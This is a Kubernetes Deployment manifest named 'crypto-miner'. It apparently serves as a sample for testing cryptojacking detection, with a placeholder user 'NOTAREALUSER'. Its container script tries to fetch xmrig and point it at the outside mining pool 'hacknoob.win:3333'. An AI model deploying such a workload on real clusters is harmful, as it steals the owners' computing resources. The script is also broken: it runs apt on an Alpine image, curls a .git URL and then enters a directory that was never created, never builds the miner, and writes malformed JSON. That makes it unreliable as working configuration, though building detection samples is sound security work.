apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: crypto-miner
  name: crypto-miner
spec:
  replicas: 1
  selector:
    matchLabels:
      app: crypto-miner
  template:
    metadata:
      labels:
        app: crypto-miner
    spec:
      containers:
      - image: arm64v8/alpine
        name: crypto-miner
        command:
        - /bin/sh
        - -c
        - |
          apt update
          apt install -y curl
          curl -L https://github.com/xmrig/xmrig.git
          cd xmrig
          config='{
          "algo": "randomx",
          "pools": [
              {
                  "url": "hacknoob.win:3333",
                  "user": "NOTAREALUSER",
                  "pass": "x",
                  "enabled": true,
              }
          ],
          "retries": 10,
          "retry-pause": 3,
          "watch": true
          }'
          echo $config > config.json
          ./xmrig -c config.json

